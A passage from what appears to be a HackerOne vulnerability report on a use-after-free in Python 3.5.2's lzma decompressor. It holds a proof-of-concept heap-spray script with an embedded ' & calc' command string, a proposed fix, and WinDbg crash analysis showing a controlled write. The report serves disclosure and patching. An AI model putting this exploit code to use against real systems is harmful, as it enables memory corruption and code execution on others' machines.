bytearray(b&#39;\\x76\\x70\\x40\\x06&#39; * int(0x100000 / 4));<br><br>\n    spray.append(meg)</p>\n\n<p>def foo():<br><br>\n    for x in range(0, 2):<br>\n        try:<br>\n            d.decompress(b&quot;\\x20\\x26\\x20\\x63\\x61\\x6c\\x63\\x00\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41&quot; * int(0x100 / (4*4)))<br>\n        except:<br>\n            pass<br>\nfoo()<br>\nprint(len(spray[0]))<br>\nprint(len(spray))</p>\n\n<p>To fix the issue, it is recommended that lzs-&gt;next_in be zeroed in the event the call to decompress_buf fails. A proposed patch is attached.</p>\n<pre class=\"highlight plaintext\"><code>result = decompress_buf(d, max_length);\nif(result == NULL) {\n    lzs-&gt;next_in = 0;\n    return NULL;\n}\n</code></pre>\n<p>A repro file is attached as well.</p>\n\n<p>Exception details:</p>\n\n<p>0:000&gt; r<br>\neax=0000000a ebx=009ef540 ecx=00000002 edx=41414141 esi=08b44970 edi=09275fe8<br>\neip=6bf55149 esp=009ef3e0 ebp=009ef434 iopl=0         nv up ei pl nz na po cy<br>\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010203<br>\nVCRUNTIME140D!TrailingDownVec+0x1f9:<br>\n6bf55149 8917            mov     dword ptr [edi],edx  ds:002b:09275fe8=????????<br>\n0:000&gt; k<br>\nChildEBP RetAddr<br><br>\n009ef3e4 5d573f80 VCRUNTIME140D!TrailingDownVec+0x1f9 [f:\\dd\\vctools\\crt\\vcruntime\\src\\string\\i386\\memcpy.asm @ 658]<br>\n009ef434 5d573383 <u>lzma_d!decompress+0x130 [c:\\source2\\python-3.5.2\\modules_lzmamodule.c @ 997]<br>\n009ef454 5d572049 _lzma_d!_lzma_LZMADecompressor_decompress_impl+0x93 [c:\\source2\\python-3.5.2\\modules_lzmamodule.c @ 1097]<br>\n009ef49c 55e6dd40 _lzma_d!_lzma_LZMADecompressor_decompress+0x79 [c:\\source2\\python-3.5.2\\modules\\clinic_lzmamodule.c.h @ 99]<br>\n009ef4d4 55f65199 python35_d!PyCFunction_Call+0x80 [c:\\source2\\python-3.5.2\\objects\\methodobject.c @ 98]<br>\n009ef4fc 55f6008d python35_d!call_function+0x3e9 [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4705]<br>\n009ef58c 55f6478d python35_d!PyEval_EvalFrameEx+0x509d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 3238]<br>\n009ef5cc 55f5afbd python35_d!_PyEval_EvalCodeWithName+0x73d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4018]<br>\n009ef608 55f5af81 python35_d!PyEval_EvalCodeEx+0x2d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4039]<br>\n009ef63c 55fe67de python35_d!PyEval_EvalCode+0x21 [c:\\source2\\python-3.5.2\\python\\ceval.c @ 777]<br>\n009ef660 55fe2daa python35_d!run_mod+0x3e [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 976]<br>\n009ef69c 55fe3dac python35_d!PyRun_FileExFlags+0x9a [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 929]<br>\n009ef730 55fe2c5b python35_d!PyRun_SimpleFileExFlags+0x3ec [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 396]<br>\n009ef74c 55d39e6d python35_d!PyRun_AnyFileExFlags+0x6b [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 80]<br>\n009ef7a0 55d38821 python35_d!run_file+0x13d [c:\\source2\\python-3.5.2\\modules\\main.c @ 318]<br>\n009ef908 1c841331 python35_d!Py_Main+0xf01 [c:\\source2\\python-3.5.2\\modules\\main.c @ 768]<br>\n009ef918 1c84178e python_d!wmain+0x11 [c:\\source2\\python-3.5.2\\programs\\python.c @ 14]<br>\n009ef92c 1c8415da python_d!invoke_main+0x1e [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 89]<br>\n009ef984 1c84146d python_d!</u><u>scrt_common_main_seh+0x15a [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 264]<br>\n009ef98c 1c8417a8 python_d!</u><u>scrt_common_main+0xd [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 309]<br>\n009ef994 742438f4 python_d!wmainCRTStartup+0x8 [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_wmain.cpp @ 17]<br>\n009ef9a8 77545de3 KERNEL32!BaseThreadInitThunk+0x24<br>\n009ef9f0 77545dae ntdll!</u><u>RtlUserThreadStart+0x2f<br>\n009efa00 00000000 ntdll!_RtlUserThreadStart+0x1b<br>\n0:000&gt; !heap -p -a edi<br>\n    address 09275fe8 found in<br>\n    _DPH_HEAP_ROOT @ 53a1000<br>\n    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)<br>\n                                    9182d68:          9275000             2000<br>\n    5c949cd2 verifier!AVrfDebugPageHeapFree+0x000000c2<br>\n    775be045 ntdll!RtlDebugFreeHeap+0x0000003c<br>\n    7751cc3e ntdll!RtlpFreeHeap+0x00000c3e<br>\n    7751b4c8 ntdll!RtlFreeHeap+0x00000268<br>\n    591067a7 ucrtbased!free_base+0x00000027<br>\n    5910394b ucrtbased!calloc_base+0x00000b5b<br>\n    5910617c ucrtbased!free_dbg+0x0000007c<br>\n    59106750 ucrtbased!free+0x00000010<br>\n    55e781bd python35_d!_PyMem_RawFree+0x0000000d [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 90]<br>\n    55e77f32 python35_d!_PyMem_DebugFree+0x00000072 [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 1892]<br>\n    55e78434 python35_d!PyMem_RawFree+0x00000014 [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 316]<br>\n    55e77ad1 python35_d!_PyObject_Free+0x00000591 [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 1618]<br>\n    55e77f32 python35_d!_PyMem_DebugFree+0x00000072 [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 1892]<br>\n    55e78724 python35_d!PyObject_Free+0x00000014 [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 410]<br>\n    55e02005 python35_d!bytes_dealloc+0x00000015 [c:\\source2\\python-3.5.2\\objects\\bytesobject.c @ 956]<br>\n    55e75f73 python35_d!_Py_Dealloc+0x00000023 [c:\\source2\\python-3.5.2\\objects\\object.c @ 1786]<br>\n    55e922f7 python35_d!tupledealloc+0x000000c7 [c:\\source2\\python-3.5.2\\objects\\tupleobject.c @ 236]<br>\n    55e75f73 python35_d!_Py_Dealloc+0x00000023 [c:\\source2\\python-3.5.2\\objects\\object.c @ 1786]<br>\n    55f651a9 python35_d!call_function+0x000003f9 [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4707]<br>\n    55f6008d python35_d!PyEval_EvalFrameEx+0x0000509d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 3238]<br>\n    55f6478d python35_d!_PyEval_EvalCodeWithName+0x0000073d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4018]<br>\n    55f5afbd python35_d!PyEval_EvalCodeEx+0x0000002d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4039]<br>\n    55f5af81 python35_d!PyEval_EvalCode+0x00000021 [c:\\source2\\python-3.5.2\\python\\ceval.c @ 777]<br>\n    55fe67de python35_d!run_mod+0x0000003e [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 976]<br>\n    55fe2daa python35_d!PyRun_FileExFlags+0x0000009a [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 929]<br>\n    55fe3dac python35_d!PyRun_SimpleFileExFlags+0x000003ec [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 396]<br>\n    55fe2c5b python35_d!PyRun_AnyFileExFlags+0x0000006b [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 80]<br>\n    55d39e6d python35_d!run_file+0x0000013d [c:\\source2\\python-3.5.2\\modules\\main.c @ 318]<br>\n    55d38821 python35_d!Py_Main+0x00000f01 [c:\\source2\\python-3.5.2\\modules\\main.c @ 768]<br>\n    1c841331 python_d!wmain+0x00000011 [c:\\source2\\python-3.5.2\\programs\\python.c @ 14]<br>\n    1c84178e python_d!invoke_main+0x0000001e [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 89]<br>\n    1c8415da python_d!</u>_scrt_common_main_seh+0x0000015a [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 264]</p>\n\n<p>0:000&gt; !analyze -v -nodb</p>\n\n<hr>\n\n<ul>\n<li>                                                                            *</li>\n<li>                       Exception Analysis                                   *</li>\n<li>                                                                            *\n*******************************************************************************</li>\n</ul>\n\n<p>FAULTING_IP: <br>\nVCRUNTIME140D!TrailingDownVec+1f9 [f:\\dd\\vctools\\crt\\vcruntime\\src\\string\\i386\\memcpy.asm @ 658]<br>\n6bf55149 8917            mov     dword ptr [edi],edx</p>\n\n<p>EXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)<br>\nExceptionAddress: 6bf55149 (VCRUNTIME140D!TrailingDownVec+0x000001f9)<br>\n   ExceptionCode: c0000005 (Access violation)<br>\n  ExceptionFlags: 00000000<br>\nNumberParameters: 2<br>\n   Parameter[0]: 00000001<br>\n   Parameter[1]: 09275fe8<br>\nAttempt to write to address 09275fe8</p>\n\n<p>CONTEXT:  00000000 -- (.cxr 0x0;r)<br>\neax=0000000a ebx=009ef540 ecx=00000002 edx=41414141 esi=08b44970 edi=09275fe8<br>\neip=6bf55149 esp=009ef3e0 ebp=009ef434 iopl=0         nv up ei pl nz na po cy<br>\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010203<br>\nVCRUNTIME140D!TrailingDownVec+0x1f9:<br>\n6bf55149 8917            mov     dword ptr [edi],edx  ds:002b:09275fe8=????????</p>\n\n<p>FAULTING_THREAD:  000043fc</p>\n\n<p>DEFAULT_BUCKET_ID:  INVALID_POINTER_WRITE</p>\n\n<p>PROCESS_NAME:  python_d.exe</p>\n\n<p>ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.</p>\n\n<p>EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.</p>\n\n<p>EXCEPTION_PARAMETER1:  00000001</p>\n\n<p>EXCEPTION_PARAMETER2:  09275fe8</p>\n\n<p>WRITE_ADDRESS:  09275fe8 </p>\n\n<p>FOLLOWUP_IP: <br>\nVCRUNTIME140D!TrailingDownVec+1f9 [f:\\dd\\vctools\\crt\\vcruntime\\src\\string\\i386\\memcpy.asm @ 658]<br>\n6bf55149 8917            mov     dword ptr [edi],edx</p>\n\n<p>NTGLOBALFLAG:  2000000</p>\n\n<p>APPLICATION_VERIFIER_FLAGS:  0</p>\n\n<p>APP:  python_d.exe</p>\n\n<p>ANALYSIS_VERSION: 6.3.9600.17029 (debuggers(dbg).140219-1702) x86fre</p>\n\n<p>PRIMARY_PROBLEM_CLASS:  INVALID_POINTER_WRITE</p>\n\n<p>BUGCHECK_STR:  APPLICATION_FAULT_INVALID_POINTER_WRITE_INVALID_POINTER_READ</p>\n\n<p>LAST_CONTROL_TRANSFER:  from 5d573f80 to 6bf55149</p>\n\n<p>STACK_TEXT:<br><br>\n009ef3e4 5d573f80 09275fe8 08b44970 0000000a VCRUNTIME140D!TrailingDownVec+0x1f9<br>\n009ef434 5d573383 060e9f40 08b44970 0000000a <u>lzma_d!decompress+0x130<br>\n009ef454 5d572049 060e9f40 009ef468 ffffffff _lzma_d!_lzma_LZMADecompressor_decompress_impl+0x93<br>\n009ef49c 55e6dd40 060e9f40 079cec40 00000000 _lzma_d!_lzma_LZMADecompressor_decompress+0x79<br>\n009ef4d4 55f65199 08b53db8 079cec40 00000000 python35_d!PyCFunction_Call+0x80<br>\n009ef4fc 55f6008d 009ef540 079cec40 06143c78 python35_d!call_function+0x3e9<br>\n009ef58c 55f6478d 06143c78 00000000 1c84114f python35_d!PyEval_EvalFrameEx+0x509d<br>\n009ef5cc 55f5afbd 079eae60 06143c78 06171978 python35_d!_PyEval_EvalCodeWithName+0x73d<br>\n009ef608 55f5af81 079eae60 06171978 06171978 python35_d!PyEval_EvalCodeEx+0x2d<br>\n009ef63c 55fe67de 079eae60 06171978 06171978 python35_d!PyEval_EvalCode+0x21<br>\n009ef660 55fe2daa 08db1470 08b4b168 06171978 python35_d!run_mod+0x3e<br>\n009ef69c 55fe3dac 06e40fc0 079f30e0 00000101 python35_d!PyRun_FileExFlags+0x9a<br>\n009ef730 55fe2c5b 06e40fc0 079f30e0 00000001 python35_d!PyRun_SimpleFileExFlags+0x3ec<br>\n009ef74c 55d39e6d 06e40fc0 079f30e0 00000001 python35_d!PyRun_AnyFileExFlags+0x6b<br>\n009ef7a0 55d38821 06e40fc0 06012fa6 009ef85c python35_d!run_file+0x13d<br>\n009ef908 1c841331 00000002 06012f80 009ef92c python35_d!Py_Main+0xf01<br>\n009ef918 1c84178e 00000002 06012f80 0601af40 python_d!wmain+0x11<br>\n009ef92c 1c8415da 851961c5 1c84114f 1c84114f python_d!invoke_main+0x1e<br>\n009ef984 1c84146d 009ef994 1c8417a8 009ef9a8 python_d!</u><u>scrt_common_main_seh+0x15a<br>\n009ef98c 1c8417a8 009ef9a8 742438f4 006cd000 python_d!</u><u>scrt_common_main+0xd<br>\n009ef994 742438f4 006cd000 742438d0 939c497b python_d!wmainCRTStartup+0x8<br>\n009ef9a8 77545de3 006cd000 5080bb84 00000000 KERNEL32!BaseThreadInitThunk+0x24<br>\n009ef9f0 77545dae ffffffff 7756b7d7 00000000 ntdll!</u>_RtlUserThreadStart+0x2f<br>\n009efa00 00000000 1c84114f 006cd000 00000000 ntdll!_RtlUserThreadStart+0x1b</p>\n\n<p>STACK_COMMAND:  .cxr 0x0 ; kb</p>\n\n<p>FAULTING_SOURCE_LINE:  f:\\dd\\vctools\\crt\\vcruntime\\src\\string\\i386\\memcpy.asm</p>\n\n<p>FAULTING_SOURCE_FILE:  f:\\dd\\vctools\\crt\\vcruntime\\src\\string\\i386\\memcpy.asm</p>\n\n<p>FAULTING_SOURCE_LINE_NUMBER:  658</p>\n\n<p>SYMBOL_STACK_INDEX:  0</p>\n\n<p>SYMBOL_NAME:  vcruntime140d!TrailingDownVec+1f9</p>\n\n<p>FOLLOWUP_NAME:  MachineOwner</p>\n\n<p>MODULE_NAME: VCRUNTIME140D</p>\n\n<p>IMAGE_NAME:  VCRUNTIME140D.dll</p>\n\n<p>DEBUG_FLR_IMAGE_TIMESTAMP:  558ce3d5</p>\n\n<p>FAILURE_BUCKET_ID:  INVALID_POINTER_WRITE_c0000005_VCRUNTIME140D.dll!TrailingDownVec</p>\n\n<p>BUCKET_ID:  APPLICATION_FAULT_INVALID_POINTER_WRITE_INVALID_POINTER_READ_vcruntime140d!TrailingDownVec+1f9</p>\n\n<p>ANALYSIS_SOURCE:  UM</p>\n\n<p>FAILURE_ID_HASH_STRING:  um:invalid_pointer_write_c0000005_vcruntime140d.dll!trailingdownvec</p>\n\n<p>FAILURE_ID_HASH:  {935a9c66-b210-2678-8c10-c746a999bfb6}</p>\n\n<h2 id=\"followup-machineowner\">Followup: MachineOwner</h2>\n", 
+    "severity_rating": "critical", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "http://www.python.org/news/security", 
+            "about": "", 
+            "twitter_handle": "", 
+            "name": "Python (IBB)"
+        }, 
+        "handle": "ibb-python", 
+        "url": "https://hackerone.com/ibb-python", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/000/027/22df52945ba6933f27a1dbc92380fe19a4a1a93d_small.png?1383737131", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/000/027/79e9602e5e25d02b7c34cdbc40438408f47e7cd7_medium.png?1383737131"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 27, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
